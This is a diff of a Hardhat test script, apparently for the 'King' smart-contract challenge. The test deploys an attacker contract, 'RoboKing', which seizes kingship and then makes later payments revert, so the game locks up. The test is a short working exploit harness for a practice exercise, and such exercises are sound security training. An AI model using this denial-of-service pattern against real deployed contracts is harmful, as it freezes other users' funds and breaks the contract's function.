@@ -4,23 +4,30 @@ const { ethers } = require("hardhat");
 describe("King", async () => {
 
     it("should win", async function () {
-        [owner, attacker, third] = await ethers.getSigners();;
+        [owner, attacker, third] = await ethers.getSigners();
 
         const King = await ethers.getContractFactory("King");
-        const contract = await King.deploy({value: ethers.utils.parseEther("1")});
+        const contract = await King.deploy({value: "1"});
         await contract.deployed();
 
-        const prize = await contract.prize();
-        console.log(`Prize: ${prize}`);
+        const RoboKing = await ethers.getContractFactory("RoboKing");
+        const hack = await RoboKing.connect(attacker).deploy();
+        await hack.deployed();
 
-        const value = ethers.BigNumber.from(2).pow(256).sub(1).toHexString();
-        console.log(`value = ${value}`);
+        // console.log(`Prize: ${await contract.prize()}`);
 
-        await attacker.sendTransaction({to: contract.address, value });
+        await third.sendTransaction({to: contract.address, value: "50"});
+        expect(await contract._king()).to.equal(third.address);
 
-        const king = await contract._king();
+        // console.log(`Prize: ${await contract.prize()}`);
 
-        expect(king).to.equal(attacker.address);
+        await hack.becomeKing(contract.address, {value: "100"});
+        expect(await contract._king()).to.equal(hack.address);
+
+        // console.log(`Prize: ${await contract.prize()}`);
+
+        expect(third.sendTransaction({to: contract.address, value: "200"})).to.be.revertedWith("no thanks")
+        expect(await contract._king()).to.equal(hack.address);
     });
 
 });
